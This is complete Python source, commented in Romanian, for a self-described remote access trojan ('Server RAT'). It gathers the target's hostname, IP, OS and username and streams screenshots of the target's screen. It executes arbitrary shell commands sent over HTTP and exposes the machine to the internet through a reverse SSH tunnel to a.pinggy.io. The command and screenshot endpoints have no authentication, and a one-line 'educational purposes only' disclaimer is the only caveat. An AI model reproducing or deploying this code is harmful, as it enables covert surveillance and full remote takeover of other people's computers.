#!/usr/bin/env python3
import os
import socket
import subprocess
import time
import threading
import base64
import json
import sys
import importlib.util
import re

# Verifică dacă un pachet este instalat
def is_package_installed(package_name):
    return importlib.util.find_spec(package_name) is not None

# Verifică și instalează dependențele necesare
def install_dependencies():
    required_packages = {
        'flask': 'flask',
        'flask_cors': 'flask-cors',
        'pyautogui': 'pyautogui',
        'numpy': 'numpy',
        'cv2': 'opencv-python'
    }
    
    packages_to_install = []
    
    for module_name, pip_package in required_packages.items():
        if not is_package_installed(module_name):
            packages_to_install.append(pip_package)
    
    if packages_to_install:
        print(f"Instalare dependențe lipsă: {', '.join(packages_to_install)}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + packages_to_install)
            print("Dependențele au fost instalate. Repornește scriptul.")
            sys.exit(1)
        except subprocess.CalledProcessError:
            print("Eroare la instalarea pachetelor. Încearcă să le instalezi manual.")
            sys.exit(1)
    else:
        print("Toate dependențele sunt deja instalate.")

# Instalează dependențele la prima rulare
install_dependencies()

# Acum importăm pachetele după ce ne-am asigurat că sunt instalate
import pyautogui
from flask import Flask, request, jsonify, Response, render_template
from flask_cors import CORS
import numpy as np
import cv2

app = Flask(__name__)
# Configurăm CORS pentru a permite cereri de la orice origine
CORS(app, resources={r"/*": {"origins": "*"}})

# Configurația serverului
SERVER_HOST = '0.0.0.0'  # Ascultă pe toate interfețele de rețea
SERVER_PORT = 8080
PASSWORD = "parola_secretă_puternică"  # Schimbă cu o parolă puternică

# Funcție pentru a obține o URL publică folosind Pinggy
def start_pinggy_tunnel():
    try:
        # Verifică dacă SSH este disponibil
        try:
            subprocess.run(["ssh", "-V"], capture_output=True, check=True)
        except (subprocess.SubprocessError, FileNotFoundError):
            print("SSH nu este instalat sau nu este disponibil. Tunelul Pinggy nu poate fi pornit.")
            return None
        
        # Comandă pentru a obține URL-ul Pinggy
        cmd = "ssh -R 0:localhost:8080 a.pinggy.io"
        
        # Pornește procesul
        process = subprocess.Popen(
            cmd, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Funcție pentru a monitoriza output-ul și a extrage URL-ul
        def monitor_output():
            pinggy_url = None
            
            # Pattern pentru a găsi URL-ul Pinggy
            url_pattern = re.compile(r'https://[^\s]+\.pinggy\.io')
            
            # Citirea și procesarea output-ului
            for line in iter(process.stdout.readline, ''):
                print("Pinggy:", line.strip())
                match = url_pattern.search(line)
                if match and not pinggy_url:
                    pinggy_url = match.group(0)
                    print(f"URL public Pinggy: {pinggy_url}")
                    # Actualizează informațiile de sistem cu URL-ul
                    system_info["public_url"] = pinggy_url
        
        # Pornește monitorizarea într-un thread separat
        monitor_thread = threading.Thread(target=monitor_output)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Așteaptă un timp pentru a oferi șansa obținerii URL-ului
        time.sleep(3)
        
        print("Tunel Pinggy pornit în fundal")
        return True
    except Exception as e:
        print(f"Eroare la pornirea tunelului Pinggy: {e}")
        return None

# Stocăm informații despre sistemul țintă
system_info = {
    "hostname": socket.gethostname(),
    "ip": socket.gethostbyname(socket.gethostname()),
    "os": os.uname()[0] if hasattr(os, 'uname') else sys.platform,
    "username": os.getlogin()
}

# Rută pentru pagina principală
@app.route('/')
def index():
    # Returnează o pagină simplă de login
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Remote Access</title>
        <style>
            body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f0f0; }
            .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            input { padding: 10px; width: 300px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; }
            button { padding: 10px 15px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; }
            button:hover { background: #3367d6; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Acces la distanță</h2>
            <input type="password" id="password" placeholder="Parolă">
            <button onclick="authenticate()">Autentificare</button>
            <p id="message"></p>
        </div>
        <script>
            function authenticate() {
                const password = document.getElementById('password').value;
                fetch('/auth', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({password: password})
                })
                .then(response => response.json())
                .then(data => {
                    if(data.success) {
                        window.location.href = '/dashboard';
                    } else {
                        document.getElementById('message').textContent = 'Parolă incorectă';
                    }
                })
                .catch(error => {
                    document.getElementById('message').textContent = 'Eroare de conexiune: ' + error.message;
                });
            }
        </script>
    </body>
    </html>
    """
    return html

# Rută pentru autentificare
@app.route('/auth', methods=['POST', 'OPTIONS'])
def auth():
    if request.method == 'OPTIONS':
        # Răspundem la cereri preflight OPTIONS
        response = jsonify({'status': 'success'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
        response.headers.add('Access-Control-Allow-Methods', 'POST')
        return response
        
    data = request.json
    if data and data.get('password') == PASSWORD:
        return jsonify({"success": True})
    return jsonify({"success": False})

# API pentru informațiile de sistem
@app.route('/api/system-info', methods=['GET', 'OPTIONS'])
def api_system_info():
    if request.method == 'OPTIONS':
        # Răspundem la cereri preflight OPTIONS
        response = jsonify({'status': 'success'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Methods', 'GET')
        return response
    
    return jsonify(system_info)

# Variabilă globală pentru a ține evidența adreselor IP care au început stream
active_streams = {}

# API pentru a începe un stream
@app.route('/api/start-stream', methods=['POST', 'OPTIONS'])
def start_stream():
    if request.method == 'OPTIONS':
        # Răspundem la cereri preflight OPTIONS
        response = jsonify({'status': 'success'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
        response.headers.add('Access-Control-Allow-Methods', 'POST')
        return response
    
    client_ip = request.remote_addr
    
    # Dacă acest IP nu a început deja un stream, înregistrăm-l
    if client_ip not in active_streams:
        active_streams[client_ip] = {'start_time': time.time()}
        print(f"\n[INFO] Stream live început de la IP: {client_ip}")
    
    return jsonify({"success": True})

# API pentru a opri un stream
@app.route('/api/stop-stream', methods=['POST', 'OPTIONS'])
def stop_stream():
    if request.method == 'OPTIONS':
        # Răspundem la cereri preflight OPTIONS
        response = jsonify({'status': 'success'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
        response.headers.add('Access-Control-Allow-Methods', 'POST')
        return response
    
    client_ip = request.remote_addr
    
    # Dacă acest IP avea un stream activ, îl oprim și afișăm durata
    if client_ip in active_streams:
        start_time = active_streams[client_ip]['start_time']
        duration = time.time() - start_time
        print(f"\n[INFO] Stream live oprit de la IP: {client_ip} (durata: {duration:.2f} secunde)")
        del active_streams[client_ip]
    
    return jsonify({"success": True})

# API pentru captură de ecran
@app.route('/api/screenshot', methods=['GET', 'OPTIONS'])
def api_screenshot():
    if request.method == 'OPTIONS':
        # Răspundem la cereri preflight OPTIONS
        response = jsonify({'status': 'success'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Methods', 'GET')
        return response
    
    try:
        # Înregistrăm doar prima cerere de la o adresă IP, nu fiecare captură
        client_ip = request.remote_addr
        
        # Facem o captură de ecran - fără mesaje în consolă
        screenshot = pyautogui.screenshot()
        
        # Convertim imaginea în format jpg
        img_np = np.array(screenshot)
        img_np = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
        _, img_encoded = cv2.imencode('.jpg', img_np, [cv2.IMWRITE_JPEG_QUALITY, 70])
        
        # Returnăm imaginea ca răspuns
        response = Response(img_encoded.tobytes(), mimetype='image/jpeg')
        response.headers.add('Access-Control-Allow-Origin', '*')
        return response
    except Exception as e:
        return jsonify({"error": str(e)})

# API pentru executare comenzi
@app.route('/api/execute', methods=['POST', 'OPTIONS'])
def api_execute():
    if request.method == 'OPTIONS':
        # Răspundem la cereri preflight OPTIONS
        response = jsonify({'status': 'success'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
        response.headers.add('Access-Control-Allow-Methods', 'POST')
        return response
    
    data = request.json
    command = data.get('command', '')
    
    try:
        # Executăm comanda și obținem output-ul
        process = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()
        
        # Combinăm output-ul standard și erorile
        output = stdout
        if stderr:
            output += "\nErori:\n" + stderr
            
        return jsonify({"output": output})
    except Exception as e:
        return jsonify({"error": str(e)})

# Rută pentru a afișa informații despre tunel
@app.route('/api/tunnel-info', methods=['GET'])
def tunnel_info():
    if 'public_url' in system_info:
        return jsonify({
            "tunnel_url": system_info['public_url'],
            "local_url": f"http://{system_info['ip']}:{SERVER_PORT}"
        })
    return jsonify({"error": "Nu există tuneluri active"})

# Rută pentru a actualiza system_info
def update_system_info():
    global system_info
    try:
        system_info = {
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": os.uname()[0] if hasattr(os, 'uname') else sys.platform,
            "username": os.getlogin(),
            "last_updated": time.strftime("%Y-%m-%d %H:%M:%S")
        }
    except Exception as e:
        print(f"Eroare la actualizarea informațiilor de sistem: {e}")

# Verificăm dacă scriptul rulează direct
if __name__ == "__main__":
    print(f"Server RAT pornit la adresa: http://{system_info['ip']}:{SERVER_PORT}")
    print(f"Poți accesa de pe orice dispozitiv din rețeaua locală.")
    print(f"IMPORTANT: Acest tool este creat doar pentru scopuri educaționale și folosire pe propriile sisteme!")
    
    # Pornește tunelul Pinggy pentru acces de la distanță
    pinggy_result = start_pinggy_tunnel()
    if pinggy_result:
        print("Serviciul Pinggy a fost pornit și va furniza un URL public pentru accesul de la distanță.")
        print("Verifică consolă pentru URL sau accesează /api/tunnel-info pentru detalii.")
    else:
        print("Nu s-a putut porni tunelul Pinggy. Serverul va fi disponibil doar în rețeaua locală.")
    
    # Actualizează informațiile de sistem periodic
    update_thread = threading.Thread(target=update_system_info)
    update_thread.daemon = True
    update_thread.start()
    
    # Pentru a activa serverul să fie accesibil din rețea
    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False) 